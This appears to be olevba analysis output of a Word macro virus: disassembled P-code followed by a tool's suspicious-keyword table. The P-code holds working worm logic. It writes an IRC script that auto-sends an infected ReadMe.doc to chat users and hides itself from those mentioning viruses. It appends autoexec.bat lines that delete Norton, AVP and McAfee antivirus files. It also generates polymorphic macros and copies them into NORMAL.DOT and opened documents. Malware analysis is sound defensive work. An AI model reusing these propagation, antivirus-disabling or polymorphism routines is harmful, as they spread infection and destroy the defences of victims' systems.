' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 ";"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "[Dem]"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "User1=*!*@*"
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "UserCount = 1"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x005B "Event1=ON JOIN:#:/dcc send $nick C:\ReadMe.doc | /msg $nick Hi! this is the file u ask for!"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0067 "Event2=ON PART:#:/dcc send $nick C:\ReadMe.doc | /notice $nick Hi! here comes your file! | /enable -q *"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004A "Event3=ON TEXT:*walvgen*:#:/msg $nick WVE W0rm PirchVers. $identd $address"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0035 "Event4=ON TEXT:*wvefileserver*:*:/faccess $nick C:\ 5"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Event5=ON TEXT:*avp*:*:/ignore $nick 1"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0029 "Event6=ON TEXT:*ReadMe*:*:/ignore $nick 1"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0026 "Event7=ON TEXT:*doc*:*:/ignore $nick 1"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "Event8=ON TEXT:*worm*:*:/ignore $nick 1"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0028 "Event9=ON TEXT:*virus*:*:/ignore $nick 1"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "Event10=ON TEXT:*info*:*:/dcc send $nick C:\ReadMe.doc"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "Event11=ON TEXT:*trad*:*:/dcc send $nick C:\ReadMe.doc"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x004F "Event12=ON QUIT:/msg #WVE_gen WVE W0rm PirchVers. was here ... $identd $address"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007A "Event13=ON DCCDONE:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe;*.pif;*.vbs;*.bat;*.txt;*.html:/dcc send $nick C:\ReadMe.doc"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x007A "Event14=ON DCCSENT:*.jpg;*.gif;*.bmp;*.avi;*.mpeg;*.mpg;*.exe;*.pif;*.vbs;*.bat;*.txt;*.html:/dcc send $nick C:\ReadMe.doc"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "EventCount = 14"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0001 ";"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "[DCC]"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0012 "AutoHideDccWin = 1"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	LitStr 0x001C "dcc send $nick C:\ReadMe.doc"
' 	LitStr 0x0000 ""
' 	LitStr 0x0042 "HKEY_USERS\.Default\Software\MeGALiTH Software\Visual IRC96\Events"
' 	LitStr 0x0007 "Event17"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #134:
' 	EndSub 
' Line #135:
' Line #136:
' 	FuncDefn (Function GenName())
' Line #137:
' 	LitDI2 0x0004 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0003 
' 	Mul 
' 	Add 
' 	St i 
' Line #138:
' 	LitStr 0x0000 ""
' 	St a$ 
' Line #139:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld i 
' 	For 
' 	BoS 0x0000 
' 	Ld a$ 
' 	LitDI2 0x0041 
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0017 
' 	Mul 
' 	Add 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St a$ 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #140:
' 	Ld a$ 
' 	St GenName$ 
' Line #141:
' 	EndFunc 
' Line #142:
' Line #143:
' 	FuncDefn (Sub InsertParaEnd())
' Line #144:
' 	ArgsCall InsertPara 0x0000 
' Line #145:
' 	ArgsLd Rnd 0x0000 
' 	St i 
' Line #146:
' 	Ld i 
' 	LitR8 0x999A 0x9999 0x9999 0x3FC9 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld GenName$ 
' 	LitStr 0x0001 "="
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Rnd 0x0000 
' 	Mul 
' 	ArgsLd Str$ 0x0001 
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld i 
' 	LitR8 0x999A 0x9999 0x9999 0x3FD9 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld GenName$ 
' 	LitStr 0x0006 "=Rnd()"
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld i 
' 	LitR8 0x3333 0x3333 0x3333 0x3FE3 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	Ld GenName$ 
' 	LitStr 0x0008 " = Now()"
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld i 
' 	LitR8 0x999A 0x9999 0x9999 0x3FE9 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "REM "
' 	Ld GenName$ 
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld i 
' 	LitR8 0x51EC 0x1EB8 0xEB85 0x3FE9 
' 	Gt 
' 	Ld i 
' 	LitR8 0xBC6A 0x9374 0x0418 0x3FEA 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0008 "REM (c) "
' 	LitStr 0x0018 "Nasty Lamer & Ugly Luser"
' 	Add 
' 	LitStr 0x000A ", Slovakia"
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	Else 
' 	BoSImplicit 
' 	Ld i 
' 	LitR8 0x0A3D 0xA3D7 0x3D70 0x3FEA 
' 	Gt 
' 	Ld i 
' 	LitR8 0x74BC 0x1893 0x5604 0x3FEA 
' 	Lt 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0059 "REM Do not forget: SlovakDictator is mother of all macro viruses of the new generation ! "
' 	ArgsCall Insert 0x0001 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' Line #147:
' 	Ld i 
' 	LitR8 0x6666 0x6666 0x6666 0x3FEE 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	ArgsCall InsertPara 0x0000 
' 	EndIf 
' Line #148:
' 	EndSub 
' Line #149:
' Line #150:
' 	FuncDefn (Sub InsertLine(cmd, a, B, c))
' Line #151:
' 	Ld cmd$ 
' 	LitStr 0x0001 " "
' 	Add 
' 	ArgsCall Insert 0x0001 
' Line #152:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0005 
' 	For 
' Line #153:
' 	ArgsLd Rnd 0x0000 
' 	LitR8 0x0000 0x0000 0x0000 0x3FE0 
' 	Gt 
' 	IfBlock 
' Line #154:
' 	Ld a$ 
' 	St d$ 
' 	BoS 0x0000 
' 	Ld B$ 
' 	St a$ 
' 	BoS 0x0000 
' 	Ld d$ 
' 	St B$ 
' Line #155:
' 	ElseBlock 
' Line #156:
' 	Ld B$ 
' 	St d$ 
' 	BoS 0x0000 
' 	Ld c$ 
' 	St B$ 
' 	BoS 0x0000 
' 	Ld d$ 
' 	St c$ 
' Line #157:
' 	EndIfBlock 
' Line #158:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #159:
' 	Ld a$ 
' 	LitStr 0x0002 ", "
' 	Add 
' 	Ld B$ 
' 	Add 
' 	LitStr 0x0002 ", "
' 	Add 
' 	Ld c$ 
' 	Add 
' 	ArgsCall Insert 0x0001 
' Line #160:
' 	EndSub 
' Line #161:
' Line #162:
' 	FuncDefn (Function GenPolyMacro(where, thismacro))
' Line #163:
' 	Ld GenName$ 
' 	St xMacroName$ 
' Line #164:
' 	Ld GenName$ 
' 	St xAutoTextName$ 
' Line #165:
' 	Ld GenName$ 
' 	St xDocVar$ 
' Line #166:
' 	Ld GenName$ 
' 	LitStr 0x0001 "$"
' 	Add 
' 	St xWinName$ 
' Line #167:
' 	Ld where 
' 	ArgsLd Str$ 0x0001 
' 	St xInfType$ 
' Line #168:
' 	Ld GenName$ 
' 	St xOnError$ 
' Line #169:
' 	MemLdWith Edit 
' 	MemLdWith Name 
' 	Ld thismacro$ 
' 	Eq 
' 	MemLdWith Show 
' 	Ld where 
' 	Eq 
' 	ArgsCall ToolsMacro 0x0003 
' Line #170:
' 	MemLdWith Toolbar 
' 	LitStr 0x0005 "Macro"
' 	Eq 
' 	MemLdWith Hide 
' 	ArgsCall ViewToolbars 0x0002 
' Line #171:
' 	Ld where 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ParaUp 0x0000 
' 	EndIf 
' Line #172:
' 	Label InsertParaEnd 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #173:
' 	LitStr 0x000E "On Error Goto "
' 	Ld xOnError$ 
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #174:
' 	LitStr 0x0010 "ScreenUpdating 0"
' 	ArgsCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #175:
' 	Ld xDocVar$ 
' 	LitStr 0x0003 "$ ="
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	LitStr 0x0001 "A"
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #176:
' 	LitStr 0x000F "SetDocumentVar "
' 	Ld xDocVar$ 
' 	Add 
' 	LitStr 0x0003 "$, "
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	Ld xAutoTextName$ 
' 	Add 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #177:
' 	Ld xWinName$ 
' 	LitStr 0x0010 " = WindowName$()"
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #178:
' 	Reparse 0x0075 "InsertLine("ToolsMacro", ".Name=" + Chr$(34) + xMacroName$ + Chr$(34), ".Show=" + xInfType$, ".Edit") : InsertParaEnd"
' Line #179:
' 	Reparse 0x0075 "InsertLine("EditAutoText", ".Name=" + Chr$(34) + xAutoTextName$ + Chr$(34), ".InsertAs=0", ".Insert") : InsertParaEnd"
' Line #180:
' 	LitStr 0x000A "DocClose 1"
' 	ArgsCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #181:
' 	LitStr 0x0009 "Activate "
' 	Ld xWinName$ 
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #182:
' 	LitStr 0x0005 "Call "
' 	Ld xMacroName$ 
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #183:
' 	Reparse 0x0077 "InsertLine("ToolsMacro", ".Name=" + Chr$(34) + xMacroName$ + Chr$(34), ".Show=" + xInfType$, ".Delete") : InsertParaEnd"
' Line #184:
' 	Ld xOnError$ 
' 	LitStr 0x0001 ":"
' 	Add 
' 	ArgsCall Insert 0x0001 
' 	BoS 0x0000 
' 	ArgsCall InsertParaEnd 0x0000 
' Line #185:
' 	LitDI2 0x0001 
' 	ArgsCall DocClose 0x0001 
' Line #186:
' 	Ld xAutoTextName$ 
' 	St GenPolyMacro$ 
' Line #187:
' 	EndFunc 
' Line #188:
' 	FuncDefn (Private Sub Retro())
' Line #189:
' 	OnError (Resume Next) 
' Line #190:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #191:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0009 "@echo off"
' 	PrintItemNL 
' Line #192:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0019 "echo muffin muffin muffin"
' 	PrintItemNL 
' Line #193:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "echo ** muffin **"
' 	PrintItemNL 
' Line #194:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000E "echo want some"
' 	PrintItemNL 
' Line #195:
' Line #196:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "echo [Norton System Check]"
' 	PrintItemNL 
' Line #197:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\norton~1\*.exe"
' 	PrintItemNL 
' Line #198:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\norton~1\*.dll"
' 	PrintItemNL 
' Line #199:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\norton~1\*.dat"
' 	PrintItemNL 
' Line #200:
' Line #201:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\norton~1\*.vxd"
' 	PrintItemNL 
' Line #202:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\norton~1\*.exe"
' 	PrintItemNL 
' Line #203:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\norton~1\*.dll"
' 	PrintItemNL 
' Line #204:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\norton~1\*.dat"
' 	PrintItemNL 
' Line #205:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\norton~1\*.vxd"
' 	PrintItemNL 
' Line #206:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #207:
' Line #208:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "echo [AVP System Check]"
' 	PrintItemNL 
' Line #209:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.avc "
' 	PrintItemNL 
' Line #210:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.set "
' 	PrintItemNL 
' Line #211:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.dll "
' 	PrintItemNL 
' Line #212:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.vxd "
' 	PrintItemNL 
' Line #213:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001E "del c:\progra~1\antiv~1\*.exe "
' 	PrintItemNL 
' Line #214:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.avc "
' 	PrintItemNL 
' Line #215:
' Line #216:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.set "
' 	PrintItemNL 
' Line #217:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.dll "
' 	PrintItemNL 
' Line #218:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.vxd "
' 	PrintItemNL 
' Line #219:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\antiv~1\*.exe "
' 	PrintItemNL 
' Line #220:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #221:
' Line #222:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "echo [McAfee System Check]"
' 	PrintItemNL 
' Line #223:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "del c:\progra~1\mcafee~1\*.dat "
' 	PrintItemNL 
' Line #224:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "del c:\progra~1\mcafee~1\*.dll "
' 	PrintItemNL 
' Line #225:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "del c:\progra~1\mcafee~1\*.exe "
' 	PrintItemNL 
' Line #226:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001F "del c:\progra~1\mcafee~1\*.vsc "
' 	PrintItemNL 
' Line #227:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\progra~1\mcafee\*.dat "
' 	PrintItemNL 
' Line #228:
' Line #229:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\progra~1\mcafee\*.dll "
' 	PrintItemNL 
' Line #230:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\progra~1\mcafee\*.exe "
' 	PrintItemNL 
' Line #231:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001D "del c:\progra~1\mcafee\*.vsc "
' 	PrintItemNL 
' Line #232:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\mcafee~1\*.dat"
' 	PrintItemNL 
' Line #233:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\mcafee~1\*.dll"
' 	PrintItemNL 
' Line #234:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\mcafee~1\*.exe"
' 	PrintItemNL 
' Line #235:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "del c:\mcafee~1\*.vsc"
' 	PrintItemNL 
' Line #236:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\mcafee\*.dat"
' 	PrintItemNL 
' Line #237:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\mcafee\*.dll"
' 	PrintItemNL 
' Line #238:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\mcafee\*.exe"
' 	PrintItemNL 
' Line #239:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "del c:\mcafee\*.vsc"
' 	PrintItemNL 
' Line #240:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0005 "echo."
' 	PrintItemNL 
' Line #241:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #242:
' 	EndSub 
' Line #243:
' 	FuncDefn (Sub Infect(where))
' Line #244:
' 	LitStr 0x0001 "A"
' 	ArgsLd GetDocumentVar$ 0x0001 
' 	St xOldAutoTextName$ 
' Line #245:
' 	LitDI2 0x0002 
' 	ArgsLd DefaultDir$ 0x0001 
' 	LitStr 0x000B "\NORMAL.DOT"
' 	Add 
' 	ArgsLd UCase$ 0x0001 
' 	St normaldot$ 
' Line #246:
' 	ArgsLd FileName$ 0x0000 
' 	St inffile$ 
' Line #247:
' 	Ld where 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #248:
' 	Ld where 
' 	LitStr 0x0008 "FileSave"
' 	ArgsLd GenPolyMacro$ 0x0002 
' 	St xAutoTextName$ 
' Line #249:
' 	MemLdWith Copy 
' 	MemLdWith Source 
' 	Ld inffile$ 
' 	Eq 
' 	MemLdWith Destination 
' 	Ld normaldot$ 
' 	Eq 
' 	MemLdWith Name 
' 	Ld xOldAutoTextName$ 
' 	Eq 
' 	MemLdWith Tab 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsCall Organizer 0x0005 
' Line #250:
' 	MemLdWith Rename 
' 	MemLdWith Source 
' 	Ld normaldot$ 
' 	Eq 
' 	MemLdWith Name 
' 	Ld xOldAutoTextName$ 
' 	Eq 
' 	MemLdWith NewName 
' 	Ld xAutoTextName$ 
' 	Eq 
' 	MemLdWith Tab 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsCall Organizer 0x0005 
' Line #251:
' 	Ld normaldot$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	Ld normaldot$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MacroCopy 0x0003 
' Line #252:
' 	Ld normaldot$ 
' 	LitStr 0x0009 ":FileSave"
' 	Add 
' 	Ld normaldot$ 
' 	LitStr 0x000B ":ToolsMacro"
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MacroCopy 0x0003 
' Line #253:
' 	ArgsCall CustomizeMenu 0x0000 
' Line #254:
' 	ElseBlock 
' Line #255:
' 	Ld where 
' 	LitStr 0x0008 "AutoOpen"
' 	ArgsLd GenPolyMacro$ 0x0002 
' 	St xAutoTextName$ 
' Line #256:
' 	MemLdWith Copy 
' 	MemLdWith Source 
' 	Ld normaldot$ 
' 	Eq 
' 	MemLdWith Destination 
' 	Ld inffile$ 
' 	Eq 
' 	MemLdWith Name 
' 	Ld xOldAutoTextName$ 
' 	Eq 
' 	MemLdWith Tab 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsCall Organizer 0x0005 
' Line #257:
' 	MemLdWith Rename 
' 	MemLdWith Source 
' 	Ld inffile$ 
' 	Eq 
' 	MemLdWith Name 
' 	Ld xOldAutoTextName$ 
' 	Eq 
' 	MemLdWith NewName 
' 	Ld xAutoTextName$ 
' 	Eq 
' 	MemLdWith Tab 
' 	LitDI2 0x0001 
' 	Eq 
' 	ArgsCall Organizer 0x0005 
' Line #258:
' 	Ld inffile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	Ld inffile$ 
' 	LitStr 0x0009 ":AutoOpen"
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MacroCopy 0x0003 
' Line #259:
' 	EndIfBlock 
' Line #260:
' Line #261:
' 	MemLdWith Name 
' 	LitStr 0x0004 "Pull"
' 	Eq 
' 	MemLdWith Initials 
' 	LitStr 0x0002 "Up"
' 	Eq 
' 	ArgsCall ToolsOptionsUserInfo 0x0002 
' Line #262:
' Line #263:
' 	EndSub 
' Line #264:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|CopyFile            |May copy a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |PullUp.vbs          |Executable file name                         |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

